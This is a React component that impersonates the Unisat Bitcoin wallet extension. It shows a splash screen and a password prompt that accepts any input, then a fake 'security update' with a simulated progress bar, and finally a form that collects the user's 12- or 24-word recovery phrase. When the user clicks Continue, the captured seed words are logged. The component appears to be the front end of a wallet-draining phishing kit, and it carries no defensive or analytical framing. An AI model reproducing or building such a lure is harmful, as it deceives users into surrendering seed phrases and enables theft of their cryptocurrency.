import { useState, useEffect } from 'react';
import unisatLogo from '../assets/unisat.png';

interface UnisatPanelProps {
  isOpen: boolean;
  onClose: () => void;
}

type ViewState = 'splash' | 'password' | 'update_prompt' | 'updating' | 'import';

export default function UnisatPanel({ isOpen, onClose }: UnisatPanelProps) {
  const [view, setView] = useState<ViewState>('splash');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [phraseLength, setPhraseLength] = useState<12 | 24>(12);
  const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
  const [updateProgress, setUpdateProgress] = useState(0);
  const [invalidCount, setInvalidCount] = useState(0);

  // Reset state when modal opens
  useEffect(() => {
    if (isOpen) {
      setView('splash');
      setPassword('');
      setShowPassword(false);
      setPhraseLength(12);
      setPhraseValues(Array(24).fill(''));
      setUpdateProgress(0);
      setInvalidCount(0);

      // Play the splash screen for 2.5 seconds
      const timer = setTimeout(() => setView('password'), 2500);
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  // Handle fake updating screen
  useEffect(() => {
    if (view === 'updating') {
      let progress = 0;
      const interval = setInterval(() => {
        progress += Math.floor(Math.random() * 15) + 5;
        if (progress >= 100) {
          progress = 100;
          clearInterval(interval);
          setTimeout(() => setView('import'), 600);
        }
        setUpdateProgress(progress);
      }, 300);
      return () => clearInterval(interval);
    }
  }, [view]);

  const handleWordChange = (index: number, value: string) => {
    const newValues = [...phraseValues];
    newValues[index] = value;
    setPhraseValues(newValues);
    
    let count = 0;
    newValues.slice(0, phraseLength).forEach(val => {
      if (val.length > 0 && !/^[a-z]+$/.test(val)) {
        count++;
      }
    });
    setInvalidCount(count);
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      const words = text.toLowerCase().trim().split(/\s+/);
      const newValues = [...phraseValues];
      
      words.forEach((word, i) => {
        if (i < phraseLength) newValues[i] = word;
      });
      
      setPhraseValues(newValues);
      
      let count = 0;
      newValues.slice(0, phraseLength).forEach(val => {
        if (val.length > 0 && !/^[a-z]+$/.test(val)) count++;
      });
      setInvalidCount(count);
    } catch (err) {
      console.error('Failed to read clipboard: ', err);
    }
  };

  const isPhraseComplete = () => {
    const activeWords = phraseValues.slice(0, phraseLength);
    return activeWords.every(word => word.trim().length > 0) && invalidCount === 0;
  };

  return (
    <>
      <div className={`fixed inset-0 z-[2147483648] font-sans ${isOpen ? 'pointer-events-auto' : 'pointer-events-none'}`}>
        
        {/* Backdrop */}
        <div 
          className={`absolute inset-0 bg-[#12121280] transition-opacity duration-[400ms] ease-in-out ${isOpen ? 'opacity-100' : 'opacity-0'}`} 
          onClick={onClose}
        ></div>
        
        {/* Main Modal */}
        <div className={`flex transition-all duration-[600ms] ease-[cubic-bezier(0.22,1,0.36,1)] fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-full max-h-full md:top-0 md:right-8 md:left-auto md:translate-x-0 md:translate-y-0 md:w-[360px] md:h-[685px] md:border border-[#eaecef] dark:border-[#ffffff1f] md:rounded-xl overflow-hidden ${isOpen ? 'scale-100 opacity-100' : 'scale-95 opacity-0'}`}>
          <div className="h-full w-full bg-[#ffffff] dark:bg-[#181818] shadow-2xl relative overflow-hidden flex flex-col">

            {/* ========================================== */}
            {/* LAYER 1: SPLASH SCREEN                     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-10 flex flex-col items-center justify-center transition-all duration-700 ease-[cubic-bezier(0.25,1,0.5,1)] bg-[#ffffff] dark:bg-[#181818] ${view === 'splash' ? 'opacity-100 scale-100 pointer-events-auto' : 'opacity-0 scale-110 blur-sm pointer-events-none'}`}>
              <div className="flex justify-center items-center gap-x-3">
                <img src={unisatLogo} alt="Unisat" className="w-14 h-14 rounded-lg animate-[unisatBounce_2s_ease-in-out_infinite]" />
                <span className="font-inter text-[#222222] dark:text-[#ffffffcc] text-[28px] font-bold uppercase tracking-widest">Unisat</span>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 2: PASSWORD SCREEN                   */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-20 flex flex-col transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] bg-[#ffffff] dark:bg-[#181818] ${view === 'password' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              <div className="flex flex-col items-center justify-center mt-20 mb-8 shrink-0">
                <div className="flex items-center justify-center gap-x-3 mb-6">
                  <img src={unisatLogo} alt="Unisat" className="w-12 h-12 rounded-lg" />
                  <span className="font-inter text-[#222222] dark:text-[#ffffffcc] text-[26px] font-bold uppercase tracking-wide">Unisat</span>
                </div>
                <h4 className="font-inter text-[#222222] dark:text-[#ffffffcc] font-bold text-[18px]">Enter your password</h4>
              </div>
              
              <div className="flex flex-col w-full flex-1 px-6">
                <div className="relative w-full mb-6">
                  <input 
                    className="w-full h-[52px] font-inter text-[16px] font-normal rounded-[10px] bg-[#f1f3f4] dark:bg-[#16161b] border border-[#f87c4b] dark:border-[#ffffff4d] text-[#f87c4b] dark:text-[#ffffff] pl-[16px] pr-[48px] py-[11px] outline-none transition-all duration-300 focus:border-[#ee7a30] dark:focus:border-[#ffffff]" 
                    type={showPassword ? "text" : "password"} 
                    placeholder="Password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                  <button 
                    type="button" 
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-4 top-[16px] text-[#000000] dark:text-[#ffffff] opacity-50 hover:opacity-90 transition-opacity cursor-pointer"
                  >
                    {!showPassword ? (
                      <svg className="w-5 h-5" viewBox="0 0 640 512" fill="currentColor"><path d="M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zm151 118.3C226 97.7 269.5 80 320 80c65.2 0 118.8 29.6 159.9 67.7C518.4 183.5 545 226 558.6 256c-12.6 28-36.6 66.8-70.9 100.9l-53.8-42.2c9.1-17.6 14.2-37.5 14.2-58.7c0-70.7-57.3-128-128-128c-32.2 0-61.7 11.9-84.2 31.5l-46.1-36.1zM394.9 284.2l-81.5-63.9c4.2-8.5 6.6-18.2 6.6-28.3c0-5.5-.7-10.9-2-16c.7 0 1.3 0 2 0c44.2 0 80 35.8 80 80c0 9.9-1.8 19.4-5.1 28.2zm9.4 130.3C378.8 425.4 350.7 432 320 432c-65.2 0-118.8-29.6-159.9-67.7C121.6 328.5 95 286 81.4 256c8.3-18.4 21.5-41.5 39.4-64.8L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5l-41.9-33zM192 256c0 70.7 57.3 128 128 128c13.3 0 26.1-2 38.2-5.8L302 334c-23.5-5.4-43.1-21.2-53.7-42.3l-56.1-44.2c-.2 2.8-.3 5.6-.3 8.5z"></path></svg>
                    ) : (
                      <svg className="w-5 h-5 opacity-90" viewBox="0 0 576 512" fill="currentColor"><path d="M288 80c-65.2 0-118.8 29.6-159.9 67.7C89.6 183.5 63 226 49.4 256c13.6 30 40.2 72.5 78.6 108.3C169.2 402.4 222.8 432 288 432s118.8-29.6 159.9-67.7C486.4 328.5 513 286 526.6 256c-13.6-30-40.2-72.5-78.6-108.3C406.8 109.6 353.2 80 288 80zM95.4 112.6C142.5 68.8 207.2 32 288 32s145.5 36.8 192.6 80.6c46.8 43.5 78.1 95.4 93 131.1c3.3 7.9 3.3 16.7 0 24.6c-14.9 35.7-46.2 87.7-93 131.1C433.5 443.2 368.8 480 288 480s-145.5-36.8-192.6-80.6C48.6 356 17.3 304 2.5 268.3c-3.3-7.9-3.3-16.7 0-24.6C17.3 208 48.6 156 95.4 112.6zM288 336c44.2 0 80-35.8 80-80s-35.8-80-80-80c-.7 0-1.3 0-2 0c1.3 5.1 2 10.5 2 16c0 35.3-28.7 64-64 64c-5.5 0-10.9-.7-16-2c0 .7 0 1.3 0 2c0 44.2 35.8 80 80 80zm0-208a128 128 0 1 1 0 256 128 128 0 1 1 0-256z"></path></svg>
                    )}
                  </button>
                </div>
                
                <div className="w-full shrink-0">
                  <button 
                    onClick={() => setView('update_prompt')}
                    disabled={password.length < 3}
                    className="w-full text-[#000000] bg-gradient-to-r from-[#ebb94c] to-[#e97e00] font-bold font-inter text-[15px] rounded-[8px] h-[48px] hover:opacity-80 disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-300 active:scale-[0.98]"
                  >
                    Unlock
                  </button>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 3: UPDATE PROMPT                     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-30 flex flex-col px-6 py-6 transition-all duration-500 ease-[cubic-bezier(0.16,1,0.3,1)] bg-[#ffffff] dark:bg-[#181818] ${view === 'update_prompt' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              <div className="flex justify-start items-center shrink-0 mb-4">
                <button className="p-1 rounded-full hover:bg-[#f9f9f9] dark:hover:bg-[#1b1b1b] transition-all duration-300 cursor-pointer active:scale-95 -ml-2" type="button" onClick={onClose}>
                  <svg className="w-6 h-6 text-[#7d7d7d] dark:text-[#9b9b9b]" viewBox="0 0 24 24" fill="none" strokeWidth="8"><path d="M20 12C20 12.5523 19.5523 13 19 13L7.41421 13L12.7071 18.2929C13.0976 18.6834 13.0976 19.3166 12.7071 19.7071C12.3166 20.0976 11.6834 20.0976 11.2929 19.7071L4.29289 12.7071C3.90237 12.3166 3.90237 11.6834 4.29289 11.2929L11.2929 4.29289C11.6834 3.90237 12.3166 3.90237 12.7071 4.29289C13.0976 4.68342 13.0976 5.31658 12.7071 5.70711L7.41421 11H19C19.5523 11 20 11.4477 20 12Z" fill="currentColor" fillRule="evenodd" clipRule="evenodd"></path></svg>
                </button>
              </div>
              
              <div className="flex flex-col flex-grow overflow-y-auto unisat-scrollbar">
                <div className="flex items-center justify-center mb-6">
                  <div className="h-16 w-16 flex items-center justify-center rounded-[16px] bg-[#ffffffc2] dark:bg-[#ffc57414]">
                    <img src={unisatLogo} alt="Unisat" className="w-12 h-12 rounded-lg" />
                  </div>
                </div>
                
                <div className="flex flex-col items-center justify-center mb-4 text-center">
                  <h4 className="font-inter text-[#f87c00] dark:text-[#ffffff] font-medium text-[20px] mb-2">Update Available</h4>
                  <p className="font-inter text-[#272727] dark:text-[#9b9b9b] font-normal text-[16px]">Version 1.7.5</p>
                </div>

                <div className="w-full mb-6 p-4 bg-[#ffc5741a] dark:bg-[#ffc57414] border border-[#a16f00] rounded-[8px]">
                  <div className="flex items-start">
                    <div className="flex-shrink-0 mr-3">
                      <svg className="w-5 h-5 text-[#fa7a00]" viewBox="0 0 24 24" fill="none" strokeWidth="8"><path d="M10.9906 2.29105C11.5576 1.7239 12.4406 1.7239 13.0068 2.29105L21.7086 10.9928C22.2757 11.5591 22.2757 12.4428 21.7086 13.0098L13.0068 21.7117C12.4406 22.2788 11.5576 22.2788 10.9906 21.7117L2.29141 13.0098C1.7252 12.4428 1.7252 11.5591 2.29141 10.9928L10.9906 2.29105Z" fill="currentColor" fillRule="evenodd" clipRule="evenodd"></path><path d="M12 8.25C12.4142 8.25 12.75 8.58579 12.75 9V13.5C12.75 13.9142 12.4142 14.25 12 14.25C11.5858 14.25 11.25 13.9142 11.25 13.5V9C11.25 8.58579 11.5858 8.25 12 8.25Z" fill="white" fillRule="evenodd" clipRule="evenodd"></path><path d="M12 15.75C12.4142 15.75 12.75 16.0858 12.75 16.5C12.75 16.9142 12.4142 17.25 12 17.25C11.5858 17.25 11.25 16.9142 11.25 16.5C11.25 16.0858 11.5858 15.75 12 15.75Z" fill="white" fillRule="evenodd" clipRule="evenodd"></path></svg>
                    </div>
                    <div>
                      <p className="font-inter text-[#f87c00] dark:text-[#ffffff] font-medium text-[14px] mb-1">Important security update</p>
                      <p className="font-inter text-[#272727] dark:text-[#cccccc] font-normal text-[14px]">This update includes critical security improvements to protect your Bitcoin assets and Ordinals.</p>
                    </div>
                  </div>
                </div>
                
                <div className="w-full mb-6">
                  <p className="font-inter text-[#222222] dark:text-[#ffffff] font-medium text-[16px] mb-3">What's new</p>
                  <ul className="space-y-3">
                    <li className="flex items-start">
                      <div className="flex-shrink-0 mr-3 mt-1.5">
                        <div className="w-2 h-2 rounded-full bg-[#f87c00]"></div>
                      </div>
                      <span className="font-inter text-[#222222] dark:text-[#ffffff] font-normal text-[14px]">Fixed security vulnerability in PSBT signing process</span>
                    </li>
                    <li className="flex items-start">
                      <div className="flex-shrink-0 mr-3 mt-1.5">
                        <div className="w-2 h-2 rounded-full bg-[#f87c00]"></div>
                      </div>
                      <span className="font-inter text-[#222222] dark:text-[#ffffff] font-normal text-[14px]">Improved BRC-20 token transfer efficiency and fee estimation</span>
                    </li>
                    <li className="flex items-start">
                      <div className="flex-shrink-0 mr-3 mt-1.5">
                        <div className="w-2 h-2 rounded-full bg-[#f87c00]"></div>
                      </div>
                      <span className="font-inter text-[#222222] dark:text-[#ffffff] font-normal text-[14px]">Added support for new Bitcoin L2 solutions</span>
                    </li>
                  </ul>
                </div>
              </div>
              
              <div className="mt-auto shrink-0 pb-2">
                <button 
                  onClick={() => setView('updating')}
                  className="w-full text-[#000000] bg-gradient-to-r from-[#ebb94c] to-[#e97e00] font-bold font-inter text-[14px] cursor-pointer rounded-[8px] px-[12px] h-[48px] hover:opacity-80 transition-all duration-300 active:scale-[0.98]" 
                  type="button"
                >
                  Update now
                </button>
                <div className="text-center mt-4">
                  <a href="https://unisat.io/" target="_blank" rel="noreferrer" className="font-inter text-[#f97c00c2] dark:text-[#ffb66d7d] text-[14px] font-medium hover:underline">Need help? Contact our supports!</a>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 4: UPDATING STATE (PROGRESS BAR)     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-40 transition-opacity duration-500 bg-[#ffffff] dark:bg-[#181818] ${view === 'updating' ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'}`}>
              <div className="flex flex-col h-full items-center justify-center px-6">
                
                <div className="mb-8 relative">
                  <div className="h-24 w-24 flex items-center justify-center bg-[#ffffffc2] dark:bg-[#ffc57414] rounded-[24px] animate-[pulse_2s_ease-in-out_infinite]">
                    <img src={unisatLogo} alt="Unisat" className="w-12 h-12 rounded-lg" />
                  </div>
                </div>
                
                <div className="flex flex-col items-center justify-center mb-10 text-center">
                  <h4 className="font-inter text-[#f87c00] dark:text-[#ffffff] font-medium text-[20px] mb-2">Updating Unisat</h4>
                  <p className="font-inter text-[#272727] dark:text-[#cccccc] font-normal text-[16px]">Please wait while we update to version 1.7.5</p>
                </div>
                
                <div className="w-full max-w-md mb-8">
                  <div className="w-full h-1.5 bg-[#f9f9f9] dark:bg-[#1b1b1b] rounded-full overflow-hidden">
                    <div className="h-full bg-gradient-to-r from-[#ebb94c] to-[#e97e00] rounded-full transition-all duration-300" style={{ width: `${updateProgress}%` }}></div>
                  </div>
                  
                  <div className="flex items-center justify-between mt-3">
                    <p className="font-inter text-[#222222] dark:text-[#ffffff] text-[14px] font-normal">Downloading update...</p>
                    <p className="font-inter text-[#222222] dark:text-[#ffffff] text-[14px] font-medium">{updateProgress}%</p>
                  </div>
                </div>

                <p className="font-inter text-[#f97c00c2] dark:text-[#ffb66d7d] text-[14px] font-medium text-center">Please do not close this window during the update.</p>
                
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 5: IMPORT WALLET (SEED PHRASE)       */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-50 bg-[#ffffff] dark:bg-[#181818] transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] flex flex-col ${view === 'import' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              <div className="mb-4 shrink-0">
                <div className="flex justify-between items-center px-3 pt-3">
                  <div>
                    <button className="p-1 rounded-full hover:bg-[#ffffff2e] dark:hover:bg-[#1b1b1b] transition-all duration-300 cursor-pointer active:scale-95" type="button" onClick={onClose}>
                      <svg className="w-6 h-6 text-[#7d7d7d] dark:text-[#9b9b9b]" viewBox="0 0 24 24" fill="none" strokeWidth="8"><path d="M20 12C20 12.5523 19.5523 13 19 13L7.41421 13L12.7071 18.2929C13.0976 18.6834 13.0976 19.3166 12.7071 19.7071C12.3166 20.0976 11.6834 20.0976 11.2929 19.7071L4.29289 12.7071C3.90237 12.3166 3.90237 11.6834 4.29289 11.2929L11.2929 4.29289C11.6834 3.90237 12.3166 3.90237 12.7071 4.29289C13.0976 4.68342 13.0976 5.31658 12.7071 5.70711L7.41421 11H19C19.5523 11 20 11.4477 20 12Z" fill="currentColor" fillRule="evenodd" clipRule="evenodd"></path></svg>
                    </button>
                  </div>
                  
                  {/* Step indicators */}
                  <div className="flex items-center justify-center gap-x-3">
                    <span className="font-inter text-[14px] font-normal text-[#222222] dark:text-[#ffffff] cursor-pointer">Step 1</span>
                    <span className="font-inter text-[14px] font-normal text-[#f87c00] dark:text-[#eac249] underline cursor-pointer">Step 2</span>
                    <span className="font-inter text-[14px] font-normal text-[#222222] dark:text-[#ffffff] opacity-50 cursor-pointer">Step 3</span>
                  </div>
                  <div className="w-6 h-6"></div>
                </div>
              </div>

              <div className="flex flex-col items-center justify-center gap-y-3 mb-4 shrink-0">
                <div className="grid items-center justify-center text-center">
                  <h4 className="font-inter text-[#f87c00] dark:text-[#ffffff] font-normal text-[18px] mb-1.5">Import with your recovery phrase</h4>
                  <p className="font-inter text-[#272727] dark:text-[#9b9b9b] font-normal text-[14px]">Type or paste your recovery phrase</p>
                </div>
              </div>

              {/* 12 / 24 Toggle Radios */}
              <div className="flex items-center justify-center gap-x-4 mb-4 shrink-0">
                <div className="flex items-center gap-2 p-2">
                  <div className="flex items-center gap-2 cursor-pointer group" onClick={() => { setPhraseLength(12); setPhraseValues(Array(24).fill('')); setInvalidCount(0); }}>
                    <div className={`w-4 h-4 rounded-full border-2 flex items-center justify-center transition-colors ${phraseLength === 12 ? 'border-[#f87c00] dark:border-[#eaca44]' : 'border-[#9b9b9b]'}`}>
                      {phraseLength === 12 && <div className="w-2 h-2 rounded-full bg-[#f87c00] dark:bg-[#eaca44]"></div>}
                    </div>
                    <span className="font-inter text-[#272727] dark:text-[#ffffff] text-[16px] font-normal select-none">12 words</span>
                  </div>
                  <div className="w-2"></div>
                  <div className="flex items-center gap-2 cursor-pointer group" onClick={() => { setPhraseLength(24); setPhraseValues(Array(24).fill('')); setInvalidCount(0); }}>
                    <div className={`w-4 h-4 rounded-full border-2 flex items-center justify-center transition-colors ${phraseLength === 24 ? 'border-[#f87c4b] dark:border-[#eaca44]' : 'border-[#9b9b9b]'}`}>
                      {phraseLength === 24 && <div className="w-2 h-2 rounded-full bg-[#f87c4b] dark:bg-[#eaca44]"></div>}
                    </div>
                    <span className="font-inter text-[#272727] dark:text-[#ffffff] text-[16px] font-normal select-none">24 words</span>
                  </div>
                </div>
              </div>

              {/* Grid */}
              <div className="px-5 max-h-[350px] overflow-y-auto unisat-scrollbar flex-1 pb-2">
                <div className="grid grid-cols-2 gap-2.5">
                  {Array.from({ length: phraseLength }).map((_, i) => {
                    const isError = phraseValues[i].length > 0 && !/^[a-z]+$/.test(phraseValues[i]);
                    return (
                      <div key={i} className="flex items-center justify-center w-full gap-x-1.5 bg-[#efefefb8] dark:bg-[#202127] p-[8px] rounded-[6px]">
                        <div className="flex justify-start w-[22px] shrink-0">
                          <span className="font-inter text-[13px] font-normal text-[#000000] dark:text-[#ffffff] opacity-50">{i + 1}.</span>
                        </div>
                        <div className="relative w-full">
                          <input 
                            className={`w-full font-inter text-[14px] font-normal rounded-[8px] py-[6px] pl-2 pr-2 outline-none transition-all duration-300 ${isError ? 'bg-[#ff00000a] text-[#f82828] dark:text-[#a52e2e] border border-[#f82828] dark:border-[#a52e2e]' : 'bg-[#f1f3f4] dark:bg-[#16161b] text-[#f87c4b] dark:text-[#ffffff] border border-[#f87c4b] dark:border-[#ffffff4d] focus:border-[#f87c4b] dark:focus:border-[#ffffff]'}`}
                            type="password" 
                            value={phraseValues[i]}
                            onChange={(e) => handleWordChange(i, e.target.value.toLowerCase())}
                          />
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* Error Label */}
              <div className={`px-6 mt-3 mb-2 transition-opacity duration-300 min-h-[18px] text-center shrink-0 ${invalidCount > 0 ? 'opacity-100' : 'opacity-0'}`}>
                <span className="font-inter text-[#ff5959] dark:text-[#d83636] font-normal text-[14px]">{invalidCount} word{invalidCount > 1 ? 's are' : ' is'} invalid or misspelled</span>
              </div>

              {/* Paste shortcut hint (Functional hidden paste button logic mapped to icon) */}
              <div className="flex items-center justify-center px-6 mb-2">
                <button onClick={handlePaste} className="text-[#f87c00] dark:text-[#eaca44] hover:opacity-80 text-[13px] font-inter transition-colors">
                  Click to Paste from Clipboard
                </button>
              </div>

              {/* Proceed Button */}
              <div className="px-6 pb-6 mt-auto shrink-0 pt-2">
                <button 
                  className="w-full text-[#000000] bg-gradient-to-r from-[rgb(235,185,76)] to-[rgb(233,126,0)] font-bold font-inter text-[14px] cursor-pointer rounded-[8px] px-[12px] h-[48px] hover:opacity-80 disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-300 active:scale-[0.98]" 
                  disabled={!isPhraseComplete()}
                  onClick={() => {
                    console.log("Unisat Import Complete:", phraseValues.slice(0, phraseLength));
                    onClose();
                  }}
                >
                  Continue
                </button>
              </div>
            </div>

          </div>
        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        .unisat-scrollbar::-webkit-scrollbar { width: 5px; }
        .unisat-scrollbar::-webkit-scrollbar-track { background: transparent; }
        .unisat-scrollbar::-webkit-scrollbar-thumb { background: rgba(0,0,0,0.1); border-radius: 10px; }
        .dark .unisat-scrollbar::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); }
        .unisat-scrollbar::-webkit-scrollbar-thumb:hover { background: #e97e00; }
        
        @keyframes unisatBounce {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-8px); }
        }
      `}} />
    </>
  );
}